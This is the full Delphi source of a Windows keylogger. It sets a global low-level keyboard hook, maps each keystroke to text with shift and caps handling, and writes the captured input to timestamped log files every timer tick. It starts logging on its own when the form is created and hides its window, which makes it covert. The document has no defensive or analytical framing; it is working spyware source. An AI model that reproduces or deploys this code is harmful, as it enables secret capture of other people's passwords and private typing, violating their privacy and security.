unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Timer1: TTimer;
    Button2: TButton;
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  


  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  kbhook:hhook;
  tmpstream:tmemorystream;
  mapi,mapi2:array[1..300] of string[15];
  wakeupstr:string;
  tmpstr:ansistring;
  started:boolean;


implementation

{$R *.dfm}


type
  PBDLLHOOKSTRUCT = ^TBDLLHOOKSTRUCT;
  TBDLLHOOKSTRUCT = record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: DWORD;
  end;

function chr(x:cardinal):string;
begin
  result:=mapi[x];
end;

function keyboardhook(nCode:Integer;wParam:WPARAM;lParam:LPARAM):lresult;stdcall;
var
  p:pbdllhookstruct;
  t:string[15];
  ishift:smallint;
  shiftdown,capdown:boolean;
  keystates:TKeyboardState;
begin
   //do something here
   if (wparam=wm_keydown) or (wparam=wm_syskeydown) then
     begin
       //186-222
       //48-57;
       p:=pbdllhookstruct(lparam);
       if p^.vkCode=145 then begin form1.Show; end;
       t:=chr(p^.vkcode);
       ishift:=getkeystate(vk_shift);
       getkeyboardstate(keystates);
       if odd(keystates[vk_capital]) then capdown:=true else capdown:=false;
       if (ishift and 128)=128 then shiftdown:=true else shiftdown:=false; //shift down!
       if (capdown=false) and (shiftdown=false) and (p^.vkcode>=65) and (p^.vkcode<=90)
        then  t:=lowercase(t);
       if (capdown=false) and (shiftdown=true) and (p^.vkcode>=186) and (p^.vkcode<=222)
        then t:=mapi2[p^.vkcode];
       if (capdown=false) and (shiftdown=true) and (p^.vkcode>=48) and (p^.vkcode<=57)
        then t:=mapi2[p^.vkcode];
       if (capdown=true) and (shiftdown=true) and  (p^.vkcode>=65) and (p^.vkcode<=90)
        then t:=lowercase(t);
       if (capdown=true) and (shiftdown=true) and (p^.vkcode>=186) and (p^.vkcode<=222)
        then t:=mapi2[p^.vkcode];
       if (capdown=true) and (shiftdown=true) and (p^.vkcode>=48) and (p^.vkcode<=57)
        then t:=mapi2[p^.vkcode];

      // tmpstream.write(t,sizeof(t));
      tmpstr:=tmpstr+t;
      end;
   result:=callnexthookex(kbhook,ncode,wparam,lparam);
end;

function kbhookstart:boolean;stdcall;
begin
   kbhook:=setwindowshookex(13,@keyboardhook,hinstance,0);
   if kbhook<>0 then result:=true else result:=false;
end;

function kbhookend:boolean;stdcall;
var
  bool:boolean;
begin
    bool:=unhookwindowshookex(kbhook);
    result:=bool;
end;


procedure TForm1.Button1Click(Sender: TObject);
begin
  if started=false then begin
  if kbhookstart then
    begin
      form1.hide;
      timer1.Enabled:=true;
      tmpstr:='';
      started:=true;
      button1.Caption:='Stop';
      button2.Enabled:=true;
    end
  else showmessage('Fail to start!');
  end
  else begin
          if kbhookend then
            begin
              timer1.Enabled:=false;
              started:=false;
              button1.Caption:='Start';
              button2.enabled:=false;
            end
          else showmessage('Fail to stop!');
  end;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
 filename:string;
 f:textfile;
 i:longint;
begin
  filename:=formatdatetime('mm-dd hh-mm-ss',now)+'.log';
  if tmpstr<>'' then begin
  assignfile(f,filename);
  rewrite(f);
  writeln(f,'['+formatdatetime('mm-dd hh-mm-ss',now)+']');
  for i:=1 to length(tmpstr) do
    begin
      if tmpstr[i]<>#13 then write(f,tmpstr[i])
      else
        writeln(f);
    end;
  //tmpstr.Clear;
   tmpstr:='';
  closefile(f);
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
started:=false;
mapi[8]:='[Backspace]';
mapi[9]:='[Tab]';
mapi[12]:='[Clear]';
mapi[13]:='[Enter]'+#13;
mapi[16]:='[Shift]';
mapi[17]:='[Ctrl]';
mapi[18]:='[Alt]';
mapi[19]:='[Pause]';
mapi[20]:='[CapsLock]';
mapi[27]:='[Ese]';
mapi[32]:='[Spacebar]';
mapi[33]:='[PageUp]';
mapi[34]:='[PageDown]';
mapi[35]:='[End]';
mapi[36]:='[Home]';
mapi[37]:='←';
mapi[38]:='↑' ;
mapi[39]:='→' ;
mapi[40]:='↓';
mapi[41]:='[Select]';
mapi[43]:='[EXECUTE]';
mapi[44]:='[PrintScreen]';
mapi[45]:='[Ins]';
mapi[46]:='[Del]';
mapi[47]:='[Help]';
mapi[48]:='0';mapi2[48]:=')';
mapi[49]:='1';mapi2[49]:='!';
mapi[50]:='2';mapi2[50]:='@';
mapi[51]:='3';mapi2[51]:='#';
mapi[52]:='4';mapi2[52]:='$';
mapi[53]:='5';mapi2[53]:='%';
mapi[54]:='6';mapi2[54]:='^';
mapi[55]:='7';mapi2[55]:='&';
mapi[56]:='8';mapi2[56]:='*';
mapi[57]:='9';mapi2[57]:='(';
mapi[65]:='A';
mapi[66]:='B';
mapi[67]:='C';
mapi[68]:='D';
mapi[69]:='E';
mapi[70]:='F';
mapi[71]:='G';
mapi[72]:='H';
mapi[73]:='I';
mapi[74]:='J';
mapi[75]:='K';
mapi[76]:='L';
mapi[77]:='M';
mapi[78]:='N';
mapi[79]:='O';
mapi[80]:='P';
mapi[81]:='Q';
mapi[82]:='R';
mapi[83]:='S';
mapi[84]:='T';
mapi[85]:='U';
mapi[86]:='V';
mapi[87]:='W';
mapi[88]:='X';
mapi[89]:='Y';
mapi[90]:='Z';
mapi[96]:='[数字盘0]';
mapi[97]:='[数字盘1]';
mapi[98]:='[数字盘2]';
mapi[99]:='[数字盘3]';
mapi[100]:='[数字盘4]';
mapi[101]:='[数字盘5]';
mapi[102]:='[数字盘6]';
mapi[103]:='[数字盘7]';
mapi[104]:='[数字盘8]';
mapi[105]:='[数字盘9]';
mapi[106]:='[数字盘上引号]';
mapi[107]:='[数字盘+]';
mapi[108]:='[Separator]';
mapi[109]:='[数字盘-]';
mapi[110]:='[数字盘.]';
mapi[111]:='[数字盘/]';
mapi[112]:='[F1]';
mapi[113]:='[F2]';
mapi[114]:='[F3]';
mapi[115]:='[F4]';
mapi[116]:='[F5]';
mapi[117]:='[F6]';
mapi[118]:='[F7]';
mapi[119]:='[F8]';
mapi[120]:='[F9]';
mapi[121]:='[F10]';
mapi[122]:='[F11]';
mapi[123]:='[F12]';
mapi[144]:='[NumLock]';
mapi[145]:='[ScrollLock]';
mapi[91]:='[左win]';
mapi[92]:='[右win]';
mapi[93]:='[快捷菜单]';
mapi[186]:=';';mapi2[186]:=':';
mapi[187]:='=';mapi2[187]:='+';
mapi[188]:=',';mapi2[188]:='<';
mapi[189]:='-';mapi2[189]:='_';
mapi[190]:='.';mapi2[190]:='>';
mapi[191]:='/';mapi2[191]:='?';
mapi[192]:='`';mapi2[192]:='~';
mapi[219]:='[';mapi2[219]:='{';
mapi[220]:='\';mapi2[220]:='|';
mapi[221]:=']';mapi2[221]:='}';
mapi[222]:='[单引号]';mapi2[222]:='"';


if started=false then begin
  if kbhookstart then
    begin
      form1.hide;
      timer1.Enabled:=true;
      tmpstr:='';
      started:=true;
      button1.Caption:='Stop';
    end
  else showmessage('Fail to start!');
  end;
end;





procedure TForm1.Button2Click(Sender: TObject);
begin
  form1.Hide;
end;


end.
